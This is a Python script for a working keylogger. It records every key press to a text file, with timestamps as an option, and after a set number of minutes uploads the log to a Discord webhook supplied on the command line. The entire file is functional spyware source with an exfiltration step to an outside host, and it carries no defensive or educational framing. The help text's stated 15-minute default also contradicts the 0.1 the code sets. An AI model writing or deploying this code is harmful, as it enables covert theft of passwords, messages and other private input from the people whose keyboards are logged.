import keyboard, time, requests, argparse
from datetime import datetime, timedelta
def main():
    parser = argparse.ArgumentParser(description="Let me copy the keyboard")
    parser.add_argument("-a", help="Your Discord webhook URL. \nThis is required!", required=True)
    parser.add_argument("-t", help="The running time in minutes. \n The default time is set to 15.", default=0.1)
    parser.add_argument("-n", help="Filename of the keylog. \nFilename must end in .txt! \nThe default name is set to keylog.txt.", default="keylog.txt", type=validate_filename)
    parser.add_argument("-d", help="Display time in keylog file.")
    args = parser.parse_args()
    print("", file=open(args.n, "w"))

    def log_keystroke(event):
        key = event.name
        if args.d:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {key}", file=open(args.n, "a"))
        else:
            print(key, file=open(args.n, "a"))

    logging_duration = args.t

    print(f"Keylogger actief voor {logging_duration} minuten...")
    keyboard.on_press(log_keystroke)

    start_time = datetime.now()
    end_time = start_time + timedelta(minutes=logging_duration)

    try:
        while datetime.now() < end_time:
            time.sleep(1)
    except:
        pass
    finally:
        sending_webhook(args.a, args.n)

    keyboard.unhook_all()

def sending_webhook(webhook, filename):
    webhook_url = webhook

    file_path = filename

    files = {
        'file': open(file_path, 'rb')
    }
    payload = {
        'content': "Here is your keylog!"
    }

    response = requests.post(webhook_url, data=payload, files=files)

    if response.status_code != 200:
        print(f"Failed to send file. HTTP Status Code: {response.status_code}")

    files['file'].close()

def validate_filename(name):
    if name.endswith(".txt"):
        return name
    else:
        raise argparse.ArgumentTypeError(f"Invalid filename: {name}. Filename must end in .txt")
if __name__ == "__main__":
    main()
